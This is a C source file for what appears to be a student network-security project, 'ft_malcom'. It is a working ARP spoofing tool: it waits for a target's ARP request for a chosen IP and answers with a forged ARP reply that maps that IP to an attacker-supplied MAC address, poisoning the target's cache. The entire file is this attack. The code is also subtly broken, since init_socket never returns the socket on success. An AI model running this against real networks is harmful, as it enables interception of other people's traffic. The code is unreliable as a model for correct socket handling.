#include "ft_malcom.h"

volatile sig_atomic_t s_flag = 1;

int find_interface(struct ifaddrs *interfaces, struct ifaddrs **returned)
{
	int family;

	for (struct ifaddrs *ifa = interfaces; ifa != NULL; ifa = ifa->ifa_next)
	{
		if (ifa->ifa_addr == NULL)
			continue;

		if ((ifa->ifa_flags & WANTED_BITS) == WANTED_BITS && !((ifa->ifa_flags & UNWANTED_BITS)))
		{
			family = ifa->ifa_addr->sa_family;
			if (family == AF_PACKET && ifa->ifa_data != NULL)
			{
				struct sockaddr_ll *ifa_comp = (struct sockaddr_ll *)(ifa->ifa_addr);
				if (ifa_comp->sll_hatype == ARPHRD_ETHER) {
					printf("Valid interface found: %s\n", ifa->ifa_name);
					*returned = ifa;
					break;
				}
			}
		}
	}

	if (!(*returned))
		return (printf("No valid interface found."), EXIT_FAILURE);
	return EXIT_SUCCESS;
}

int rcv_set_timeout(int sock_fd)
{
	struct timeval rcv_tout;
	ft_memset(&rcv_tout, 0, sizeof(rcv_tout));
	rcv_tout.tv_sec = 1;
	if (setsockopt(sock_fd, SOL_SOCKET, SO_RCVTIMEO, &rcv_tout, sizeof(rcv_tout)) == -1)
		return EXIT_FAILURE;
	return EXIT_SUCCESS;
}

void sig_handler(int signo)
{
	(void)signo;
	s_flag = 0;
	ft_putstr_fd("\tSIGINT intercepted.\n", STDERR_FILENO);
}

/* Return the newly created socket or -1 if an error occured */
int init_socket(int *if_index)
{
	struct ifaddrs *interfaces, *if_found;
	int packet_socket;

	if (getifaddrs(&interfaces) == -1) {
		return -1;
	}

	if (find_interface(interfaces, &if_found)) return -1;

	packet_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (packet_socket == -1) {
		err("socket", strerror(errno));
		freeifaddrs(interfaces);
		return -1;
	}
	printf("Socket created (%d)\n", packet_socket);

	if (rcv_set_timeout(packet_socket)) {
		err("socket", strerror(errno));
		cleanup(interfaces, packet_socket);
		return -1;
	}

	if (setsockopt(packet_socket, SOL_SOCKET, SO_BINDTODEVICE, if_found->ifa_name, ft_strlen(if_found->ifa_name)) == -1) {
		err("socket", strerror(errno));
		cleanup(interfaces, packet_socket);
		return -1;
	}

	printf("Socket option updated -- socket bind to (%s)\n", if_found->ifa_name);

	*if_index = if_nametoindex(if_found->ifa_name);
	if (*if_index == -1) {
		err("if_nametoindex", strerror(errno));
		cleanup(interfaces, packet_socket);
		return -1;
	}

}

int main(int argc, char *argv[])
{
	struct in_addr s_ip, t_ip;
	struct sigaction sa;
	unsigned char t_mac[6], s_mac[6];
	int packet_socket, if_index;

	if (argc != 5) {
		printf("ft_malcom: not enough arguments.\nUsage: sudo ./ft_malcom <source ip> <source mac> <target ip> <target mac>\n");
		return EXIT_FAILURE;
	}

	if (parse_mac(argv[4], t_mac) || parse_mac(argv[2], s_mac)) {
		err("parsing", "mac address");
		return EXIT_FAILURE;
	}
	if (arg_check(argv + 1, &s_ip, &t_ip)) return EXIT_FAILURE;

	ft_memset(&sa, 0, sizeof(sa));
	sa.sa_handler = sig_handler;
	if (sigaction(SIGINT, &sa, NULL) == -1) {
		err("signal", strerror(errno));
		return EXIT_FAILURE;
	}

	packet_socket = init_socket(&if_index);
	if (packet_socket == -1)
		return EXIT_FAILURE;

	while (s_flag) {
		ssize_t r;
		unsigned char buffer[BUFF_SIZE];
		r = recvfrom(packet_socket, buffer, BUFF_SIZE, 0, NULL, NULL);
		if (r == -1 && errno == EAGAIN)
			continue;
		else if (r == -1)
			break;

		//struct eth_header *rcv_resp = (struct eth_header *) buffer;
		struct arp_header *arp_req = (struct arp_header *) (buffer + ETH2_HEADER_LEN);

		/* Check the received packet */
		uint16_t h_arp_op = ntohs(arp_req->ar_op);
		if (h_arp_op != ARP_REQUEST) continue;

		if (ft_memcmp(&s_ip.s_addr, arp_req->ar_tpa, 4)) continue;
		struct in_addr sender_ip;
		ft_memcpy(&sender_ip.s_addr, arp_req->ar_spa, sizeof(uint32_t));
		if (ft_memcmp(&sender_ip.s_addr, &t_ip.s_addr, 4)) continue;
		if (ft_memcmp(t_mac, arp_req->ar_sha, 6)) continue;


		printf("An ARP request has been broadcast.\n");
		printf("\tmac address of request: %02x:%02x:%02x:%02x:%02x:%02x\n",
					arp_req->ar_sha[0],
					arp_req->ar_sha[1],
					arp_req->ar_sha[2],
					arp_req->ar_sha[3],
					arp_req->ar_sha[4],
					arp_req->ar_sha[5]);
		char str[INET_ADDRSTRLEN];
		if (inet_ntop(AF_INET, &sender_ip, str, INET_ADDRSTRLEN) == NULL) {
			s_flag = 0;
			err("inet_ntop", strerror(errno));
			continue;
		}
		else
			printf("\tip address of request:  %s\n", str);

		/* Create de ARP packet */
		unsigned char r_buffer[BUFF_SIZE];
		ft_memset(r_buffer, 0, sizeof(r_buffer));

		struct eth_header *eth_rep = (struct eth_header *) r_buffer;
		struct arp_header *arp_rep = (struct arp_header *) (r_buffer + ETH2_HEADER_LEN);

		/* Create the eth header */
		ft_memcpy(eth_rep->eth_dha, arp_req->ar_sha, MAC_LENGTH);
		ft_memcpy(eth_rep->eth_sha, s_mac, MAC_LENGTH);
		eth_rep->eth_type = htons(ETH_P_ARP);

		/* Create de ARP header */
		arp_rep->ar_hrd = htons(ARPHRD_ETHER);
		arp_rep->ar_pro = htons(ETH_P_IP);
		arp_rep->ar_hln = MAC_LENGTH;
		arp_rep->ar_pln = IPV4_LENGTH;
		arp_rep->ar_op = htons(ARP_REPLY);
		
		ft_memcpy(arp_rep->ar_sha, s_mac, MAC_LENGTH);
		ft_memcpy(arp_rep->ar_spa, &s_ip.s_addr, IPV4_LENGTH);
		ft_memcpy(arp_rep->ar_tha, t_mac, MAC_LENGTH);
		ft_memcpy(arp_rep->ar_tpa, &t_ip.s_addr, IPV4_LENGTH);

		/* Create the sockaddr for the response */
		struct sockaddr_ll socket_address;
		ft_memset(&socket_address, 0, sizeof(socket_address));

		socket_address.sll_family = AF_PACKET;
		socket_address.sll_protocol = htons(ETH_P_ARP);
		socket_address.sll_ifindex = if_index;
		socket_address.sll_halen = MAC_LENGTH;

		ft_memcpy(&socket_address.sll_addr, t_mac, MAC_LENGTH);

		/* Send the response */
		size_t r_buffer_size = sizeof(struct eth_header) + sizeof(struct arp_header);
		if (sendto(packet_socket, r_buffer, r_buffer_size, 0, 
				(struct sockaddr *) &socket_address, sizeof(socket_address)) == -1) {
					err("sendto", strerror(errno));
					break;
		}
		
		s_flag = 0;
	}

	close(packet_socket);

	return EXIT_SUCCESS; 
}
